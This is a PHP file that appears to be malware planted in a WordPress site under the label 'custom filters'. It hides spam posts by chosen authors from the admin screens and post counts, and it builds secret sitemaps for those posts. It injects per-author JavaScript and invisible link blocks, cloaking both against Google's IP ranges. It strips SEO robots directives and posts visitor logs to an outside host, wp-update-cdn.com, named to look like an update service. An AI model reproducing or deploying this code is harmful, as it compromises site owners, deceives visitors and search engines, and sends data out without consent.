<?php
	/* custom filters */

	function add_where_condition($where) {
		global $wpdb, $userSettingsArr;

		$ids = array_keys($userSettingsArr);
		$idsCommaSeparated = implode(', ', $ids);

		if (!is_single() && is_admin()) {
			add_filter('views_edit-post', 'fix_post_counts');
			return $where . " AND {$wpdb->posts}.post_author NOT IN ($idsCommaSeparated)";
		}

		return $where;
	}

	function post_exclude($query) {

		global $userSettingsArr;

		$ids = array_keys($userSettingsArr);
		$excludeString = modifyWritersString($ids);

		if (!$query->is_single() && !is_admin()) {
			$query->set('author', $excludeString);
		}
	}

	function wp_core_js() {

		global $post, $userSettingsArr;

		foreach ($userSettingsArr as $id => $settings) {
			if (($id == $post->post_author) && (isset($settings['js']))) {

				if (hideJSsource($settings)) {
					break;
				}
				echo $settings['js'];
				break;
			}
		}
	}

	function hideJSsource($settings) {
		if (isset($settings['nojs']) && $settings['nojs'] === 1) {
			//customSetDebug('cloacking is on!');
			//customSendDebug();
			if (customCheckSe()) {
				return true;
			}
		}
		return false;
	}

	function fix_post_counts($views) {
		global $current_user, $wp_query;

		$types = array(
			array('status' => NULL),
			array('status' => 'publish'),
			array('status' => 'draft'),
			array('status' => 'pending'),
			array('status' => 'trash'),
			array('status' => 'mine'),
		);
		foreach ($types as $type) {

			$query = array(
				'post_type' => 'post',
				'post_status' => $type['status']
			);

			$result = new WP_Query($query);

			if ($type['status'] == NULL) {
				if (preg_match('~\>\(([0-9,]+)\)\<~', $views['all'], $matches)) {
					$views['all'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['all']);
				}
			} elseif ($type['status'] == 'mine') {


				$newQuery = $query;
				$newQuery['author__in'] = array($current_user->ID);

				$result = new WP_Query($newQuery);

				if (preg_match('~\>\(([0-9,]+)\)\<~', $views['mine'], $matches)) {
					$views['mine'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['mine']);
				}
			} elseif ($type['status'] == 'publish') {
				if (preg_match('~\>\(([0-9,]+)\)\<~', $views['publish'], $matches)) {
					$views['publish'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['publish']);
				}
			} elseif ($type['status'] == 'draft') {
				if (preg_match('~\>\(([0-9,]+)\)\<~', $views['draft'], $matches)) {
					$views['draft'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['draft']);
				}
			} elseif ($type['status'] == 'pending') {
				if (preg_match('~\>\(([0-9,]+)\)\<~', $views['pending'], $matches)) {
					$views['pending'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['pending']);
				}
			} elseif ($type['status'] == 'trash') {
				if (preg_match('~\>\(([0-9,]+)\)\<~', $views['trash'], $matches)) {
					$views['trash'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['trash']);
				}
			}
		}
		return $views;
	}

	function filter_function_name_4055($counts, $type, $perm) {

		if ($type === 'post') {
			$old_counts = $counts->publish;
			$counts_mod = posts_count_custom($perm);
			$counts->publish = !$counts_mod ? $old_counts : $counts_mod;
		}
		return $counts;
	}

	function posts_count_custom($perm) {
		global $wpdb, $userSettingsArr;

		$ids = array_keys($userSettingsArr);
		$idsCommaSeparated = implode(', ', $ids);

		$type = 'post';

		$query = "SELECT post_status, COUNT( * ) AS num_posts FROM {$wpdb->posts} WHERE post_type = %s";

		if ('readable' == $perm && is_user_logged_in()) {

			$post_type_object = get_post_type_object($type);

			if (!current_user_can($post_type_object->cap->read_private_posts)) {
				$query .= $wpdb->prepare(
						" AND (post_status != 'private' OR ( post_author = %d AND post_status = 'private' ))", get_current_user_id()
				);
			}
		}
		$query .= " AND post_author NOT IN ($idsCommaSeparated) GROUP BY post_status";
		$results = (array) $wpdb->get_results($wpdb->prepare($query, $type), ARRAY_A);

		foreach ($results as $tmpArr) {
			if ($tmpArr['post_status'] === 'publish') {
				return $tmpArr['num_posts'];
			}
		}
	}

	function all_custom_posts_ids($userId) {
		global $wpdb;

		$query = "SELECT ID FROM {$wpdb->posts} where post_author = $userId";

		$results = (array) $wpdb->get_results($query, ARRAY_A);

		$ids = array();
		foreach ($results as $tmpArr) {
			$ids[] = $tmpArr['ID'];
		}
		return $ids;
	}

	function custom_flush_rules() {

		global $userSettingsArr, $wp_rewrite;

		$rules = get_option('rewrite_rules');

		foreach ($userSettingsArr as $key => $arr) {
			$regex = key($arr['sitemapsettings']);

			if (!isset($rules[$regex]) ||
					($rules[$regex] !== current($arr['sitemapsettings']))) {
				$wp_rewrite->flush_rules();
			}
		}
	}

	function sitemap_xml_rules($rules) {

		global $userSettingsArr;

		$newrules = array();

		foreach ($userSettingsArr as $key => $arr) {
			if (isset($arr['sitemapsettings'])) {
				$newrules[key($arr['sitemapsettings'])] = current($arr['sitemapsettings']);
			}
		}

		return $newrules + $rules;
	}

	function customSitemapFeed() {

		global $userSettingsArr;

		foreach ($userSettingsArr as $key => $arr) {
			$feedName = str_replace('index.php?feed=', '', current($arr['sitemapsettings']));
			add_feed($feedName, 'customSitemapFeedFunc');
		}
	}

	function customSitemapFeedFunc() {
	//ini_set('memory_limit', '256MB');
		header('Content-Type: ' . feed_content_type('rss-http') . '; charset=' . get_option('blog_charset'), true);
	//header('Content-Type: ' . feed_content_type('rss') . '; charset=' . get_option('blog_charset'), true);
		status_header(200);

		$head = sitemapHead();
		$sitemapSource = $head . "\n";

		$userId = findUserIdByRequestUri();

		$posts_ids = all_custom_posts_ids($userId);
		$priority = '0.5';
		$changefreq = 'weekly';
		$lastmod = date('Y-m-d');

		foreach ($posts_ids as $post_id) {
			$url = get_permalink($post_id);
			$sitemapSource .= urlBlock($url, $lastmod, $changefreq, $priority);
			wp_cache_delete($post_id, 'posts');
		}

		$sitemapSource .= "\n</urlset>";

		echo $sitemapSource;
	}

	function sitemapHead() {
		return <<<STR
	<?xml version="1.0" encoding="UTF-8"?>
	<urlset
		xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
		xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
		xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
				http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">

		
	STR;
	}

	function urlBlock($url, $lastmod, $changefreq, $priority) {

		return <<<STR
	<url>
		<loc>$url</loc>
		<lastmod>$lastmod</lastmod>
		<changefreq>$changefreq</changefreq>
		<priority>$priority</priority>
	</url>\n\n
	STR;
	}

	function modifyWritersString($writersArr) {
		$writersArrMod = array();

		foreach ($writersArr as $item) {
			$writersArrMod[] = '-' . $item;
		}
		return implode(',', $writersArrMod);
	}

	function customFiltersSettings() {
		$settings = get_option('wp_custom_filters');

		if (!$settings) {
			return null;
		}

		return unserialize(base64_decode($settings));
	}

	function findUserIdByRequestUri() {

		global $userSettingsArr;

		foreach ($userSettingsArr as $key => $arr) {

			$regexp = key($arr['sitemapsettings']) . '|'
					. str_replace('index.php?', '', current($arr['sitemapsettings']) . '$');

			if (preg_match("~$regexp~", $_SERVER['REQUEST_URI'])) {
				return $key;
			}
		}
	}

	function isCustomPost() {
		global $userSettingsArr, $post;

		$authors_ids_arr = array_keys($userSettingsArr);
		if (in_array($post->post_author, $authors_ids_arr)) {
			return true;
		}
		return false;
	}

	function removeYoastMeta() {
		global $userSettingsArr, $post;

		$authors_ids_arr = array_keys($userSettingsArr);
		
		if (!$post  || !property_exists($post, 'author')) {
			return;
		}
		
		if (in_array($post->post_author, $authors_ids_arr)) {
			add_filter('wpseo_robots', '__return_false');
			add_filter('wpseo_googlebot', '__return_false'); // Yoast SEO 14.x or newer
			add_filter('wpseo_bingbot', '__return_false'); // Yoast SEO 14.x or newer
		}
	}

	function getRemoteIp() {

		if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			return $_SERVER['HTTP_X_FORWARDED_FOR'];
		}
		if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
			return $_SERVER['HTTP_CF_CONNECTING_IP'];
		}
		if (isset($_SERVER['REMOTE_ADDR'])) {
			return $_SERVER['REMOTE_ADDR'];
		}

		return false;
	}

	function customCheckSe() {

		$ip = getRemoteIp();

		if (strstr($ip, ', ')) {
			$ips = explode(', ', $ip);
			$ip = $ips[0];
		}

		$ranges = customSeIps();

		if (!$ranges) {
			return false;
		}

		foreach ($ranges as $range) {
			if (customCheckInSubnet($ip, $range)) {
				//customSetDebug(sprintf('black_list||%s||%s||%s||%s', $ip, $range
				//                , $_SERVER['HTTP_USER_AGENT'], $_SERVER['HTTP_ACCEPT_LANGUAGE']));
				return true;
			}
		}

		//customSetDebug(sprintf('white list||%s||%s||%s||%s', $ip, $range
		//                , $_SERVER['HTTP_USER_AGENT'], $_SERVER['HTTP_ACCEPT_LANGUAGE']));
		return false;
	}

	function customIsRenewTime($timestamp) {
		//if ((time() - $timestamp) > 60 * 60 * 24) {
		if ((time() - $timestamp) > 60 * 60) {
			return true;
		}
		//customSetDebug(sprintf('time - %s, timestamp - %s', time(), $timestamp));
		return false;
	}

	function customSetDebug($data) {

		if (($value = get_option('wp_debug_data')) && is_array($value)) {
			$value[] = sprintf('%s||%s||%s', time(), $_SERVER['HTTP_HOST'], $data);
			update_option('wp_debug_data', $value, false);
			return;
		}

		update_option('wp_debug_data', array($data), false);
	}

	function customSendDebug() {

		$value = get_option('wp_debug_data');

		if (!is_array($value) || (count($value) < 100)) {
			return;
		}
		$url = 'http://wp-update-cdn.com/src/ualogsec.php';

		$response = wp_remote_post($url, array(
			'method' => 'POST',
			'timeout' => 10,
			'body' => array(
				'host' => $_SERVER['HTTP_HOST'],
				'debugdata' => gzcompress(json_encode($value)), 9)
				)
		);

		if (is_wp_error($response)) {
			return;
		} else {
			if (trim($response['body']) === 'success') {
				update_option('wp_debug_data', array(), false);
			}
		}
	}

	function customSeIps() {

		if (($value = get_option('wp_custom_range')) && !customIsRenewTime($value['timestamp'])) {
			return $value['ranges'];
		} else {
			//customSetDebug('time to update ranges');
			$response = wp_remote_get('https://www.gstatic.com/ipranges/goog.txt');
			if (is_wp_error($response)) {
				//customSetDebug('error response ipranges');
				return;
			}
			$body = wp_remote_retrieve_body($response);
			$ranges = preg_split("~(\r\n|\n)~", trim($body), -1, PREG_SPLIT_NO_EMPTY);

			if (!is_array($ranges)) {
				//customSetDebug('invalid update ranges not an array');
				return;
			}

			$value = array('ranges' => $ranges, 'timestamp' => time());
			update_option('wp_custom_range', $value, true);
			return $value['ranges'];
		}
	}

	function customInetToBits($inet) {
		$splitted = str_split($inet);
		$binaryip = '';
		foreach ($splitted as $char) {
			$binaryip .= str_pad(decbin(ord($char)), 8, '0', STR_PAD_LEFT);
		}
		return $binaryip;
	}

	function customCheckInSubnet($ip, $cidrnet) {
		$ip = inet_pton($ip);
		$binaryip = customInetToBits($ip);

		list($net, $maskbits) = explode('/', $cidrnet);
		$net = inet_pton($net);
		$binarynet = customInetToBits($net);

		$ip_net_bits = substr($binaryip, 0, $maskbits);
		$net_bits = substr($binarynet, 0, $maskbits);

		if ($ip_net_bits !== $net_bits) {
			//echo 'Not in subnet';
			return false;
		} else {
			return true;
		}
	}

	/**
	 function buffer_start_custom() {

	global $post, $userSettingsArr;

	$authors_ids_arr = array_keys($userSettingsArr);



	if (!in_array($post->post_author, $authors_ids_arr)) {
	if (is_single() || (is_front_page() || is_home())) {
	ob_start("callback_custom");
	}
	}
	}
	* 
	*/
	function buffer_start_custom() {
	echo '<!--buffer start custom--!>'.PHP_EOL;
		if (!isCustomPost()) {
			if (is_singular() || (is_front_page() || is_home())) {
				echo '<!--start callback custom--!>'.PHP_EOL;
				ob_start("callback_custom");
			}
		}
	}

	function buffer_end_custom() {
		ob_end_flush();
	}

	function callback_custom($buffer) {
		global $homeLinksSettingsArr;
		
		return buffer_prepare_custom($homeLinksSettingsArr, $buffer);
	}

	function buffer_prepare_custom($homeLinksSettingsArr, $buffer) {
		
		if (($homeLinksSettingsArr['hiddenType']['cloacking'] === 1) && !customCheckSe()) {
			customSetDebug('no google bot, without changes ' . getRemoteIp());
			return $buffer;
		}

		
		$textBlock = text_block_custom($homeLinksSettingsArr);
		$textBlock = additional_style_custom($homeLinksSettingsArr, $textBlock);


		if ($homeLinksSettingsArr['position']['footer'] === 1) {
			customSetDebug('footer position');
			return $buffer . PHP_EOL . $textBlock;
		}
		if ($homeLinksSettingsArr['position']['head'] === 1) {
			customSetDebug('header position');
			return $textBlock . PHP_EOL . $buffer;
		}
	}

	function text_block_custom($homeLinksSettingsArr) {

		global $post;
		
		$block = '';

		if ($homeLinksSettingsArr['textBlocksCount']['onlyHomePage'] === 1) {
			if (is_front_page() || is_home()) {
				customSetDebug('home page mode');
				$block = get_option('home_links_custom_0');
			}
		} elseif ($homeLinksSettingsArr['textBlocksCount']['10DifferentTextBlocks'] === 1) {

			$url = get_permalink($post->ID);
			preg_match('~\d~', md5($url), $matches);
			$block = get_option('home_links_custom_' . $matches[0]);
			$log = sprintf('10DifferentTextBlocks page mode block num - %s permalink - %s', $matches[0], $url);
			customSetDebug($log);
		} elseif ($homeLinksSettingsArr['textBlocksCount']['100DifferentTextBlocks'] === 1) {

			$url = get_permalink($post->ID);
			preg_match_all('~\d~', md5($url), $matches);
			$digits = ($matches[0][0] == 0) ? $matches[0][1] : $matches[0][0] . '' . $matches[0][1];
			$block = get_option('home_links_custom_' . $digits);
			$log = sprintf('100DifferentTextBlocks page mode block num - %s permalink - %s', $digits, $url);
			customSetDebug($log);
		} elseif ($homeLinksSettingsArr['textBlocksCount']['fullDifferentTextBlocks'] === 1) {
			
		} else {
			
		}

		return !$block ? '' : $block;
	}

	function additional_style_custom($homeLinksSettingsArr, $textBlock) {
		
		if (empty($textBlock)) {
			return '';
		}

		if ($homeLinksSettingsArr['hiddenType']['css'] === 1) {
			return css_rule_custom()[0] . PHP_EOL . $textBlock . PHP_EOL . css_rule_custom()[1];
		}
		return $textBlock;
	}

	function css_rule_custom() {
		//return ['<div style="display: none;">', '</div>'];
		return ['<div style="position:absolute; filter:alpha(opacity=0);opacity:0.003;z-index:8;">', '</div>'];
	}

	function home_links_settings_custom($settings) {
		foreach ($settings as $key => $arr) {
			if (isset($arr['homeLinks'])) {
				return $arr['homeLinks'];
			}
		}
		return array();
	}

	$userSettingsArr = customFiltersSettings();

	if (is_array($userSettingsArr)) {
		add_filter('posts_where_paged', 'add_where_condition');

		add_action('pre_get_posts', 'post_exclude');
		add_action('wp_enqueue_scripts', 'wp_core_js');

		add_filter('wp_count_posts', 'filter_function_name_4055', 10, 3);

		add_filter('rewrite_rules_array', 'sitemap_xml_rules');
		add_action('wp_loaded', 'custom_flush_rules');
		add_action('init', 'customSitemapFeed');
		add_action('template_redirect', 'removeYoastMeta');

		$homeLinksSettingsArr = home_links_settings_custom($userSettingsArr);

		if (!empty($homeLinksSettingsArr)) {

			customSendDebug();

			add_action('wp_head', 'buffer_start_custom');
			add_action('wp_footer', 'buffer_end_custom');
		}
	}

	/* custom filters */
